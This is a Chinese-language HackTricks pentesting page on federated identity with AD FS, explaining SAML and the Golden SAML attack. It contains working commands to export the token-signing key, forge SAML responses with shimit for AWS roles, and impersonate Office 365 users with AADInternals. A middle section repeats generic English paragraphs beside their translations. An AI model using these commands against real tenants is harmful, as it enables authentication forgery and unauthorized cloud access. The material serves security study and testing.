# 联合身份

<details>

<summary><strong>支持HackTricks并获得好处！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧**。

</details>

## 基本信息

**联合身份**是一组已建立**信任**的**域**的集合。信任的级别可能会有所不同，但通常包括**身份验证**，并且几乎总是包括**授权**。一个典型的联合可能包括一些已建立**信任**以便对一组资源进行**共享访问**的组织。

您可以将您的**本地环境**与Azure AD进行**联合**，并将此联合用于身份验证和授权。这种登录方法确保所有用户的**身份验证发生在本地**。此方法允许管理员实施更严格的访问控制级别。支持与**AD FS**和PingFederate的联合。

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

基本上，在联合中，所有的**身份验证**都发生在**本地**环境中，用户可以通过使用他们的**本地凭据**来访问**云**应用程序。

**安全断言标记语言（SAML）**用于在提供者之间**交换**所有的身份验证和授权**信息**。

在任何联合设置中，都有三个参与方：

* 用户或客户端
* 身份提供者（IdP）
* 服务提供者（SP）

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. 首先，用户**尝试访问一个应用程序**（也称为SP，即服务提供者），该应用程序可能是AWS控制台、vSphere Web客户端等。根据实现方式，客户端可能直接先访问IdP，跳过此图表中的第一步。
2. 然后，应用程序**检测到IdP**（即身份提供者，可以是AD FS、Okta等）以对用户进行身份验证，**生成SAML AuthnRequest**并将客户端重定向到IdP。
3. **IdP对用户进行身份验证**，**创建SAMLResponse**并通过用户将其发送给SP。
4. SP **检查SAMLResponse**并**登录用户**。SP必须与IdP建立信任关系。用户现在可以使用该服务。

**如果您想了解更多关于SAML身份验证和常见攻击的信息，请访问：**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## 枢纽

* AD FS是基于声明的身份模型。
* "..声明只是关于用户的陈述（例如，名称、身份、组），主要用于授权访问位于互联网上任何位置的基于声明的应用程序。"
* 用户的声明写在SAML令牌中，然后由IdP签名以提供机密性。
* 用户由ImmutableID标识。它在Azure AD中是全局唯一的并存储在其中。
* ImmutableID存储在本地作为用户的asm-DS-ConsistencyGuid，或者可以从用户的GUID派生而来。
* 更多信息请参见[https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML攻击：**

* 在ADFS中，SAML响应由令牌签名证书签名。
* 如果证书被攻击者获取，就可以作为任何同步到Azure AD的用户进行身份验证！
* 就像我们滥用PTA一样，更改用户的密码或多因素身份验证都不会产生任何影响，因为我们正在伪造身份验证响应。
* 证书可以从具有DA权限的AD FS服务器中提取，然后可以从任何连接到互联网的计算机上使用。
* 更多信息请参见[https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

从前面的图表中，最有趣的部分是第三部分，即**IdP**生成授权用户登录的**SAMLResponse**。根据特定的IdP实现，**响应**可能是由**IdP的私钥**进行**签名**或**加密**的。这样，**SP可以验证**SAMLResponse确实是由可信任的IdP创建的。

类似于[黄金票据攻击](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)，使用**签署**包含**用户身份**和**权限**的对象的**密钥**（黄金票据为KRBTGT，黄金SAML为令牌签名私钥），我们可以伪造这样一个“身份验证对象”（TGT或SAMLResponse），并冒充任何用户以获取未经授权的访问SP。

此外，黄金SAML具有以下优点：

* 它们可以从几乎**任何地方**生成。您不需要成为您正在处理的任何域、联合或其他环境的一部分
* 即使启用了**双因素身份验证**，它们也是有效的
* 令牌签名**私钥**不会自动**更新**
* 更改用户的**密码**不会影响生成的SAML
#### AWS + AD FS + Golden SAML = ♥ (案例研究)

[Active Directory Federation Services](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) (**AD FS**) 是一种基于微软标准的域服务，允许在可信任的业务伙伴之间**安全共享身份信息**（联合）。它基本上是域中的一个服务，为联合中的其他服务提供商提供域用户身份。

假设 AWS **信任**你已经入侵的域（在联合中），那么你可以利用这种攻击，实际上**获得云环境中的任何权限**。要执行此攻击，你需要拥有**签署 SAML 对象的私钥**（类似于黄金票据中对 KRBTGT 的需求）。对于这个私钥，你不需要域管理员访问权限，只需要 AD FS 用户帐户。

以下是执行黄金 SAML 攻击所需的要求列表：

* **令牌签名私钥**
* **IdP 公钥证书**
* **IdP 名称**
* **角色名称（要扮演的角色）**
* 域\用户名
* AWS 中的角色会话名称
* Amazon 帐户 ID

_强制要求已突出显示。对于其他非强制字段，你可以输入任何你喜欢的内容。_

对于**私钥**，你需要访问**AD FS 帐户**，并从其**个人存储**中**导出私钥**（可以使用工具如 [mimikatz](https://github.com/gentilkiwi/mimikatz) 进行导出）。对于其他要求，你可以导入 PowerShell snapin Microsoft.Adfs.Powershell 并按以下方式使用它（你必须以 ADFS 用户身份运行）：
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
有了所有这些信息，可能会忘记一个有效的SAMLResponse，作为你想要冒充的用户使用[**shimit**](https://github.com/cyberark/shimit)**：**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
### 本地 -> 云端

To perform lateral movement from an on-premises environment to the cloud, you can leverage federation with Azure AD Connect. Federation allows you to establish a trust relationship between your on-premises Active Directory (AD) and Azure AD.

要从本地环境到云端执行横向移动，您可以利用与Azure AD Connect的联合。联合允许您在本地Active Directory（AD）和Azure AD之间建立信任关系。

By configuring federation, you can enable single sign-on (SSO) for your users, allowing them to seamlessly access cloud resources using their on-premises credentials. This eliminates the need for users to remember and manage separate credentials for both environments.

通过配置联合，您可以为用户启用单一登录（SSO），使他们可以使用本地凭据无缝访问云资源。这消除了用户需要记住和管理两个环境的不同凭据的需求。

To set up federation, you need to install and configure Azure AD Connect on your on-premises environment. This tool synchronizes user accounts and passwords between your on-premises AD and Azure AD.

要设置联合，您需要在本地环境中安装和配置Azure AD Connect。该工具在本地AD和Azure AD之间同步用户帐户和密码。

Once federation is established, you can use various techniques to exploit misconfigurations or vulnerabilities in Azure AD Connect to gain unauthorized access to cloud resources.

一旦建立了联合，您可以使用各种技术来利用Azure AD Connect中的配置错误或漏洞，以获取对云资源的未经授权访问。

Some potential attack vectors include:

一些潜在的攻击向量包括：

- Exploiting weak or default credentials used by Azure AD Connect.
- Exploiting misconfigurations in the synchronization process.
- Exploiting vulnerabilities in the Azure AD Connect software.
- Exploiting privilege escalation vulnerabilities in Azure AD Connect.

- 利用Azure AD Connect使用的弱密码或默认凭据。
- 利用同步过程中的配置错误。
- 利用Azure AD Connect软件中的漏洞。
- 利用Azure AD Connect中的特权升级漏洞。

By compromising Azure AD Connect, an attacker can potentially gain control over the synchronization process and manipulate user accounts and permissions in both the on-premises and cloud environments.

通过入侵Azure AD Connect，攻击者有可能控制同步过程并在本地和云环境中操纵用户帐户和权限。

It is important to regularly update and patch Azure AD Connect to mitigate known vulnerabilities and ensure the security of your hybrid identity infrastructure.

定期更新和修补Azure AD Connect以减轻已知漏洞并确保混合身份基础结构的安全性非常重要。

{% code %}
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
也可以创建仅限云用户的不可变ID，并冒充他们。
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## 参考资料

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 HackTricks 的 PDF 版本，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享您的黑客技巧。**

</details>
